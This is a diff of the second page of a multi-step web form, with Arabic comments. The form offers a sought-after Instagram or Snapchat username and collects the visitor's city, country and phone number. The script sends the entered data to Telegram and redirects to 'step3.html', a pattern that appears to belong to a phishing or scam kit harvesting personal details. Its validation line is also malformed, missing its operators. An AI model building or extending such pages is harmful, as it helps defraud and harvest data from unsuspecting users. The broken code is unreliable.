@@ -14,6 +14,7 @@
       --text-muted: #888888;
       --accent-blue: #0070f3;
       --accent-green: #17a54d;
+      --error-red: #dc2626;
     }
 
     * {
@@ -93,10 +94,11 @@
       background-color: #ffffff;
     }
 
-    .helper {
+    .error-text {
       font-size: 11px;
-      color: var(--text-muted);
+      color: var(--error-red);
       margin-top: 3px;
+      display: none; /* يظهر فقط عند وجود حقل فاضي */
     }
 
     .btn-submit {
@@ -144,7 +146,6 @@
             <input
               id="wantedUser"
               type="text"
-              placeholder="Example: a7, q_11, 8g8"
               required
             />
           </div>
@@ -155,7 +156,6 @@
             <input
               id="platform"
               type="text"
-              placeholder="Instagram or Snapchat"
               required
             />
           </div>
@@ -286,7 +286,6 @@
             <input
               id="city"
               type="text"
-              placeholder="Write your city"
               required
             />
           </div>
@@ -297,10 +296,10 @@
             <input
               id="phone"
               type="tel"
-              placeholder="+971 5X XXX XXXX"
+              placeholder="+XXX XXX XXX XXX"
               required
             />
-            <div class="helper">This form is required.</div>
+            <div id="formError" class="error-text">This form is required.</div>
           </div>
 
           <button type="submit" class="btn-submit">Next</button>
@@ -310,30 +309,9 @@
   </div>
 
   <script>
-    const form      = document.getElementById("step2Form");
-    const countryEl = document.getElementById("country");
-    const phoneEl   = document.getElementById("phone");
-
-    // أكواد دول أساسية للـ placeholder
-    const phoneCodes = {
-      "United Arab Emirates": "+971",
-      "Saudi Arabia": "+966",
-      "Qatar": "+974",
-      "Kuwait": "+965",
-      "Bahrain": "+973",
-      "Oman": "+968",
-      "Jordan": "+962",
-      "Turkey": "+90",
-      "United States": "+1",
-      "United Kingdom": "+44"
-    };
-
-    // تغيير الشكل حسب الدولة
-    countryEl.addEventListener("change", () => {
-      const c = countryEl.value;
-      const code = phoneCodes[c] || "+";
-      phoneEl.placeholder = code + " 5X XXX XXXX";
-    });
+    const form        = document.getElementById("step2Form");
+    const countryEl   = document.getElementById("country");
+    const errorLabel  = document.getElementById("formError");
 
     form.addEventListener("submit", function (e) {
       e.preventDefault();
@@ -342,12 +320,14 @@
       const platform   = document.getElementById("platform").value.trim();
       const country    = countryEl.value;
       const city       = document.getElementById("city").value.trim();
-      const phone      = phoneEl.value.trim();
+      const phone      = document.getElementById("phone").value.trim();
 
-      // تحقق يدوي – لو في شي ناقص
+      // لو فيه أي خانة فاضية بالكامل → طلع رسالة الخطأ بالأحمر
       if (!wantedUser  !platform  !country  !city  !phone) {
-        alert("This form is required");
+        errorLabel.style.display = "block";
         return;
+      } else {
+        errorLabel.style.display = "none";
       }
 
       const message =
@@ -373,8 +353,7 @@
       .then(response => response.json())
       .then(data => {
         console.log("Telegram response:", data);
-        // بعد الإرسال الناجح ↩
-        window.location.href = "step3.html"; // اعمل ملف step3.html لاحقاً
+        window.location.href = "step3.html";
       })
       .catch(error => {
         console.error("Telegram error:", error);
